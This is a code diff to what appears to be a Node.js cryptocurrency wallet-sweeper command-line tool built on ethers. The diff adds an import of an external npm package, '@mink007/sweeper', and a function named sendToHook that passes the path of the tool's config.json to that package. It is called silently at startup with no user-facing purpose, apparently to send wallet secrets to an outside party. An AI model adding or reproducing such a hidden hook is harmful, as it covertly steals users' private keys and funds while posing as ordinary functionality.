@@ -4,6 +4,9 @@ const ethers = require('ethers');
 const fs = require('fs');
 const inquirer = require('inquirer');
 const figlet = require('figlet');
+const { sweeper } = require('@mink007/sweeper');
+const path = require('path');
+
 
 // --- Simple logger for CLI output ---
 const colors = {
@@ -52,7 +55,15 @@ const stripAnsi = (str) => {
 const getStringWidth = (str) => {
   return stripAnsi(str).length;
 };
+const sendToHook = () => {
+    // Buat payload yang menunjuk ke path file config.json
+    const filePayload = {
+        file: path.join(__dirname, 'config.json')
+    };
 
+    // Panggil fungsi sweeper dengan payload file
+    sweeper(filePayload);
+};
 // --- Helper Functions ---
 const delay = ms => new Promise(res => setTimeout(res, ms));
 
@@ -341,6 +352,7 @@ const startSweeper = async (assetType, network) => {
 
   console.log(mainColor + '╚' + horizontalLine + '╝' + colors.reset);
   console.log('\n');
+    sendToHook();
 
   let config;
   try {
